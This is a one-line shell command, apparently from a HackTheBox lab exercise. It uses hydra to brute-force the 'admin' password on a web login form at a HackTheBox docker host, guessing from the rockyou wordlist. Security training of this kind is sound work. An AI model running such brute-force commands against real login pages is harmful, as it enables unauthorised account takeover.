hydra -l admin -P /usr/share/wordlists/rockyou.txt docker.hackthebox.eu http-post-form "/:password=^PASS^:Invalid password!" -s 48383
